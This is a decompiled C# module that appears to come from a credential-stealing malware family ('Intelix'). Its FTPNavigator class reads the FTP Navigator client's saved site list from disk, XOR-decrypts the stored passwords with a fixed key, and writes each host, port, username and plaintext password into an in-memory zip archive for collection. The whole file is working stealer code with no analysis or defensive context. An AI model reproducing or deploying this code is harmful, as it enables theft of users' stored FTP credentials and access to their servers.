using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000044 RID: 68
	public class FTPNavigator : ITarget
	{
		// Token: 0x060000E3 RID: 227 RVA: 0x0000D380 File Offset: 0x0000B580
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\FTP Navigator\\Ftplist.txt";
			bool flag = !File.Exists(text);
			if (!flag)
			{
				string[] array = File.ReadAllLines(text);
				List<string> list = new List<string>();
				Counter.CounterApplications counterApplications = new Counter.CounterApplications
				{
					Name = "FTP Navigator"
				};
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					bool flag2 = !string.IsNullOrWhiteSpace(text2);
					if (flag2)
					{
						string[] array4 = text2.Split(new char[]
						{
							';'
						});
						string text3 = array4[1].Split(new char[]
						{
							'='
						})[1];
						string text4 = array4[2].Split(new char[]
						{
							'='
						})[1];
						string input = array4[3].Split(new char[]
						{
							'='
						})[1];
						string text5 = array4[4].Split(new char[]
						{
							'='
						})[1];
						bool flag3 = !(array4[5].Split(new char[]
						{
							'='
						})[1] != "0");
						if (flag3)
						{
							string text6 = Xor.DecryptString(input, 25);
							list.Add(string.Concat(new string[]
							{
								"Url: ",
								text3,
								":",
								string.IsNullOrEmpty(text4) ? "21" : text4,
								"\nUsername: ",
								text5,
								"\nPassword: ",
								text6,
								"\n"
							}));
							counterApplications.Files.Add(text + " => FTP Navigator\\Hosts.txt");
						}
					}
				}
				bool flag4 = list.Count > 0;
				if (flag4)
				{
					string text7 = "FTP Navigator\\Hosts.txt";
					zip.AddFile(text7, Encoding.UTF8.GetBytes(string.Join("\n", list)));
					counterApplications.Files.Add(text7);
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
